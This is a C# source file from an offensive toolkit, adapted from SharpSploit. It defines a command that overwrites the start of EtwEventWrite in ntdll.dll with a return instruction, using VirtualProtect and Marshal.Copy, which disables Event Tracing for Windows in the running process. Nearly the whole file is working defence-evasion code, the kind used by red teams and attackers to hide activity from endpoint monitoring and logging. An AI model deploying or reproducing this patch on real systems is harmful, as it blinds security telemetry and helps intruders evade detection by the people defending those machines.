// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Runtime.InteropServices;
using TaotieToolkit.config;
using Utils.PlatformInvoke;

namespace TaotieToolkit
{

    /// <summary>
    /// ETW is a class for manipulating Event Tracing for Windows (ETW).
    /// </summary>
    public class PatchETWEventWrite : ICommand, ICommandMarker
    {

        public string Name => "PatchETWEventWrite";
        public string Description => "Patch ETW";

        /// <summary>
        /// Patch the EtwEventWrite function in ntdll.dll.
        /// </summary>
        /// <author>Simone Salucci & Daniel López @ NCC Group</author>
        /// <returns>Bool. True if succeeded, otherwise false.</returns>
        /// <remarks>
        /// Code has been adapted from Adam Chester (https://blog.xpnsec.com/hiding-your-dotnet-etw/) and Mythic Atlas (https://github.com/its-a-feature/Mythic/tree/master/Payload_Types/atlas).
        ///</remarks>
        public void Execute(string[] args)
        {
            byte[] patch;
            if (Utils.Is64Bit)
            {
                patch = new byte[1];
                patch[0] = 0xc3;
                //patch[1] = 0x00;   //这段非必须，用作填充
            }
            else
            {
                patch = new byte[3];
                patch[0] = 0xc2;
                patch[1] = 0x14;
                patch[2] = 0x00;
            }

            try
            {
                var library = Win32.Kernel32.LoadLibrary("ntdll.dll");
                var address = Win32.Kernel32.GetProcAddress(library, "EtwEventWrite");
                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                Console.WriteLine("[*] ETW Patch Sucess!");
            }
            catch (Exception e)
            {
                Console.WriteLine("\t[-] ETW patch failed,exception:" + e.Message);
            }
        }
    }
}
